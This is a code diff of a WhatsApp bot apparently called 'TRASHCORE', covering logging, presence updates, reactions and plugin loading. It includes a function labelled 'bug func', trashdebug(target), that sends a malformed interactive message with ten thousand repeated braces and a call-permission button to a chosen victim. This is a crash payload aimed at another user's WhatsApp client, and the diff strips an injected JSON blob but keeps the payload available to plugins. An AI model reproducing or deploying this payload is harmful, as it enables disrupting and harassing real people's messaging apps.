@@ -6,7 +6,7 @@ const os = require('os')
 const fs = require('fs')
 const fg = require('api-dylux')
 const fetch = require('node-fetch');
-const util = require('util')
+const util = require('utils')
 const axios = require('axios')
 const { exec, execSync } = require("child_process")
 const chalk = require('chalk')
@@ -44,7 +44,7 @@ const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLo
 const args = body.trim().split(/ +/).slice(1)
 const text = q = args.join(" ")
 const sender = m.key.fromMe ? (trashcore.user.id.split(':')[0]+'@s.whatsapp.net' || trashcore.user.id) : (m.key.participant || m.key.remoteJid)
-const botNumber = await trashcore.decodeJid(trashcore.user.id)
+const botNumber = trashcore.user.id.split(':')[0];
 const senderNumber = sender.split('@')[0]
 const trashown = (m && m.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
     const premuser = JSON.parse(fs.readFileSync("./library/database/premium.json"));
@@ -62,9 +62,7 @@ const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
 const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
 const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
 /////////////Setting Console//////////////////
-if (m.message) {
-console.log(chalk.black(chalk.bgWhite('[ New Message ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('» from'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('» to'), chalk.green(m.isGroup ? pushname : 'Private Chat', from))
-}
+console.log(chalk.black(chalk.bgWhite(!command ? '[ MESSAGE ]' : '[ COMMAND ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
 /////////quoted functions//////////////////
 const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `🩸⃟‣𝐓𝐑𝐀𝐒𝐇𝐂𝐎𝐑𝐄-𝐂𝐋𝐈𝐄𝐍𝐓≈🚭`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://files.catbox.moe/yqbio5.jpg' }}}}
 ////////////////Reply Message////////////////
@@ -101,10 +99,37 @@ newsletterName: "🩸⃟‣𝐓𝐑𝐀𝐒𝐇𝐂𝐎𝐑𝐄-𝐂𝐋𝐈𝐄
 quoted: fkontak
 })
 }
+ //////////React message///////////////
+    const reaction = async (jidss, emoji) => {
+    trashcore.sendMessage(jidss, {
+        react: { text: emoji,
+                key: m.key 
+               } 
+            }
+        );
+    };
+ /////////function set presence/////
+                   if (global.autoRecording) {
+        trashcore.sendPresenceUpdate('recording', from)
+        }      
+      if (global.autoTyping) {
+        trashcore.sendPresenceUpdate('composing', from)
+        }
+        if (global.autorecordtype) {
+        let trashrecord = ['recording','composing']
+        let xeonrecordinfinal = trashrecord[Math.floor(Math.random() * trashrecord.length)]
+        trashcore.sendPresenceUpdate(xeonrecordinfinal, from)
+
+        }
+if (m.isGroup) {
+    if (body.includes(`@254104245659`)) {
+        reaction(m.chat, "❓")
+    }
+ }
 ///////////////Similarity///////////////////////
 function getCaseNames() {
   try {
-    const data = fs.readFileSync('./trashhandler.js', 'utf8');
+    const data = fs.readFileSync('./WhatsApp.js', 'utf8');
     const casePattern = /case\s+'([^']+)'/g;
     const matches = data.match(casePattern);
 
@@ -119,21 +144,9 @@ function getCaseNames() {
   }
 }
 
-if (prefix && command) {
-  const caseNames = getCaseNames();
-  let noPrefix = m.text.replace(prefix, '').trim();
-  let mean = didyoumean(noPrefix, caseNames);
-  let sim = similarity(noPrefix, mean);
-  let similarityPercentage = parseInt(sim * 100);
-
-  if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
-    const response = (`Sorry, the command you entered is incorrect. Here are some commands that might be suitable:\n\n➠  *${prefix + mean}*\n➠  *similarity:* ${similarityPercentage}%`);
-    reply(response);
-  }
-}
 /////////////fetch commands///////////////
 let totalfeature= () =>{
-var mytext = fs.readFileSync("./trashhandler.js").toString()
+var mytext = fs.readFileSync("./WhatsApp.js").toString()
 var numUpper = (mytext.match(/case '/g) || []).length;
 return numUpper
         }
@@ -150,51 +163,6 @@ reply(`bot is always online ✅`)
 ///////////example///////////////////////////
 ////////bug func/////////////////////
     async function trashdebug(target) {
-let InJectXploit = JSON.stringify({
-status: true,
-criador: "TheXtordcv",
-resultado: {
-type: "md",
-ws: {
-_events: {
-"CB:ib,,dirty": ["Array"]
-},
-_eventsCount: 800000,
-_maxListeners: 0,
-url: "wss://web.whatsapp.com/ws/chat",
-config: {
-version: ["Array"],
-browser: ["Array"],
-waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
-sockCectTimeoutMs: 20000,
-keepAliveIntervalMs: 30000,
-logger: {},
-printQRInTerminal: false,
-emitOwnEvents: true,
-defaultQueryTimeoutMs: 60000,
-customUploadHosts: [],
-retryRequestDelayMs: 250,
-maxMsgRetryCount: 5,
-fireInitQueries: true,
-auth: {
-Object: "authData"
-},
-markOnlineOnsockCect: true,
-syncFullHistory: true,
-linkPreviewImageThumbnailWidth: 192,
-transactionOpts: {
-Object: "transactionOptsData"
-},
-generateHighQualityLinkPreview: false,
-options: {},
-appStateMacVerification: {
-Object: "appStateMacData"
-},
-mobile: true
-}
-}
-}
-});
 let msg = await generateWAMessageFromContent(
 target, {
 viewOnceMessage: {
@@ -205,17 +173,16 @@ title: "",
 hasMediaAttachment: false,
 },
 body: {
-text: "⩟𝐓𝐑𝐀𝐒𝐇𝐂𝐎𝐑𝐄⬦ - 𝚵𝚳𝚸𝚬𝚪𝚯𝐑",
+text: "𝐓𝐑𝐀𝐒𝐡𝐜𝐨𝐫𝐞 -𝐄𝐗𝐏𝐥𝐨𝐫𝐚𝐭𝐢𝐨𝐧 ",
 },
 nativeFlowMessage: {
 messageParamsJson: "{".repeat(10000),
 buttons: [{
 name: "single_select",
-buttonParamsJson: InJectXploit,
 },
 {
 name: "call_permission_request",
-buttonParamsJson: InJectXploit + "{",
+buttonParamsJson: "",
 },
 ],
 },
@@ -231,12 +198,15 @@ participant: {
 jid: target
 },
 });
-}  
+}
+
+
     
 ///////////end bug func///////////
 const example = (teks) => {
 return `\n *invalid format!*\n`
 }
+
 /////////////plugins commands/////////////
 const menu = require('./library/listmenu/menulist');
 const pluginsLoader = async (directory) => {
@@ -261,7 +231,7 @@ return plugins
 //========= [ COMMANDS PLUGINS ] =================================================
 let pluginsDisable = true
 const plugins = await pluginsLoader(path.resolve(__dirname, "trashplugs"))
-const trashdex = { trashown, reply,replymenu,command,isCmd, text, botNumber, prefix, reply,fetchJson,example, totalfeature,trashcore,m,q,mime,sleep,fkontak,menu,addPremiumUser, delPremiumUser,isPremium,trashpic,trashdebug,sleep,isAdmins,groupAdmins,isBotAdmins}
+const trashdex = { trashown, reply,replymenu,command,isCmd, text, botNumber, prefix, reply,fetchJson,example, totalfeature,trashcore,m,q,mime,sleep,fkontak,menu,addPremiumUser, args,delPremiumUser,isPremium,trashpic,trashdebug,sleep,isAdmins,groupAdmins,isBotAdmins,quoted,from,groupMetadata,downloadAndSaveMediaMessage}
 for (let plugin of plugins) {
 if (plugin.command.find(e => e == command.toLowerCase())) {
 pluginsDisable = false
